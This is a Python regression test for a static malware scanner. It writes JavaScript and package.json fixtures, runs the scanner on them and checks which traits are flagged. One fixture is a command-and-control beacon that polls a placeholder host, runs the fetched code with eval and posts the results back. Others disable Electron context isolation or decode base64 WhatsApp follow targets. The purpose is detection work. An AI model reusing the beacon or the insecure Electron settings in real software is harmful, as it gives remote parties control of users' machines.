#!/usr/bin/env python3
"""Static regressions: generated JavaScript is scanned, never executed."""
import argparse
import json
from pathlib import Path
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
BEACON = 'objectives/command-and-control/beacon/network/periodic::interval-http-task-result-channel'
BOUND = 'objectives/command-and-control/beacon/network/periodic::interval-json-command-eval'
QUERY = 'micro-behaviors/communications/messaging/channel::whatsapp-newsletter-follow-query'
ISOLATION = 'metadata/hardening/sandbox::electron-context-isolation-disabled-option'
GIT = 'metadata/package/dependencies/manifest/source::npm-git-dependency-outside-upstream-baileys-config'
NODE = 'metadata/hardening/sandbox::electron-node-integration-enabled-option'
DECODE = 'micro-behaviors/communications/messaging/channel::whatsapp-newsletter-follow-base64-target'

TASK = '''async function worker() {
  const response = await fetch('https://tasks.example.net/check', {method: 'POST'});
  const job = await response.json();
  switch (job.operation) {
    case 'run':
      const output = eval(job.source);
      await fetch('https://tasks.example.net/result', {
        method: 'POST', body: JSON.stringify({output})
      });
      break;
  }
}
let clock = setInterval(worker, 18000);
'''

def objects(text):
    decoder = json.JSONDecoder()
    while text.strip():
        text = text.lstrip()
        obj, end = decoder.raw_decode(text)
        yield obj
        text = text[end:]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--output', type=Path, required=True)
    args = ap.parse_args()
    args.output.mkdir(parents=True, exist_ok=True)
    call = 'executeWMexQuery2({newsletter_id: Buffer.from(id, "base64").toString()}, QueryIds.FOLLOW, XWAPaths.join);'
    cases = {
        'git-config/package.json': (json.dumps({'name': 'example-client', 'dependencies': {'bridge': 'git+https://github.com/example/bridge.git'}}), {'metadata/package/dependencies/manifest/source::npm-git-url-dependency'}, set()),
        'git-pinned/package.json': (json.dumps({'name': 'example-client', 'dependencies': {'bridge': 'git+https://github.com/example/bridge.git#' + 'a' * 40}}), {'metadata/package/dependencies/manifest/source::npm-git-url-dependency'}, set()),
        'upstream/package.json': (json.dumps({'name': '@whiskeysockets/baileys', 'dependencies': {'libsignal': 'github:WhiskeySockets/libsignal-node'}}), set(), {GIT}),
        'registry/package.json': (json.dumps({'name': 'example-client', 'dependencies': {'bridge': '^1.0.0'}}), set(), {GIT}),
        'electron.js': ('new BrowserWindow({webPreferences: {contextIsolation: false, nodeIntegration: true}});', {ISOLATION, NODE}, set()),
        'isolated.js': ('new BrowserWindow({webPreferences: {contextIsolation: true, nodeIntegration: false}});', set(), {ISOLATION, NODE}),
        'unrelated-options.js': ('const obj = {contextIsolation: false, nodeIntegration: true};', set(), {ISOLATION, NODE}),
        'comment-options.js': ('/* const obj = {webPreferences: {contextIsolation: false, nodeIntegration: true}}; */', set(), {ISOLATION, NODE}),
        'periodic.js': (TASK, {BEACON, BOUND}, set()),
        'periodic.ts': (TASK.replace('worker', 'changed').replace('job', 'task'), {BEACON, BOUND}, set()),
        'unrelated-timer.js': (TASK.replace('setInterval(worker,', 'setInterval(health,') + 'function health() {}', set(), {BEACON, BOUND}),
        'one-shot.js': (TASK.replace('setInterval(worker, 18000)', 'worker()'), set(), {BEACON, BOUND}),
        'local-code.js': (TASK.replace('eval(job.source)', 'eval(localSource)'), set(), {BEACON, BOUND}),
        'unrelated-json.js': (TASK.replace('await response.json()', 'await other.json()'), set(), {BEACON, BOUND}),
        'reassigned.js': (TASK.replace("case 'run':", "case 'run': job = localJob;"), set(), {BEACON, BOUND}),
        'renamed-callback.js': (TASK.replace('let clock =', 'worker = health; let clock ='), set(), {BEACON, BOUND}),
        'quoted.js': ('console.log(' + json.dumps(TASK) + ');', set(), {BEACON, BOUND}),
        'bundler-follow.js': (call, {QUERY, DECODE}, set()),
        'plain-follow.js': (call.replace('WMexQuery2', 'WMexQuery'), {QUERY, DECODE}, set()),
        'ignore-follow.js': (call.replace('WMexQuery2', 'WMexQueryIgnoreResponse12'), {QUERY, DECODE}, set()),
        'wrapper-nearmiss.js': ('function executeWMexQuery(...args) { return genericWMexQuery(...args); } const text = \"base64\"; const action = QueryIds.FOLLOW;', set(), {DECODE}),
        'metadata.js': (call.replace('QueryIds.FOLLOW', 'QueryIds.METADATA').replace('newsletter_id: ', 'newsletter_id: "FOLLOW", value: '), set(), {QUERY, DECODE}),
    }
    with tempfile.TemporaryDirectory(prefix='acquit-static-controls-') as tmp:
        for name, (source, _, _) in cases.items():
            path = Path(tmp, name)
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(source)
        run = subprocess.run(['cleave', '--no-update-check', '--traits-dir', str(ROOT),
                              '--disable', 'yara,radare2,upx', '--format=json', tmp],
                             capture_output=True, text=True, check=True)
        reports = {str(Path(f['path']).relative_to(tmp)): f for d in objects(run.stdout) for f in d['files']}
        results = {}
        for name, (_, required, forbidden) in cases.items():
            emitted = {t['id'] for t in reports[name]['traits']}
            assert required <= emitted, (name, 'missing', sorted(required - emitted))
            assert not forbidden & emitted, (name, 'unexpected', sorted(forbidden & emitted))
            results[name] = sorted(emitted & {BEACON, BOUND, QUERY, DECODE, ISOLATION, NODE, GIT})
        (args.output / 'focused-results.json').write_text(json.dumps(results, indent=2) + '\n')
    print(f'PASS: {len(cases)} beacon, follow-query and Electron declaration controls')

if __name__ == '__main__':
    main()
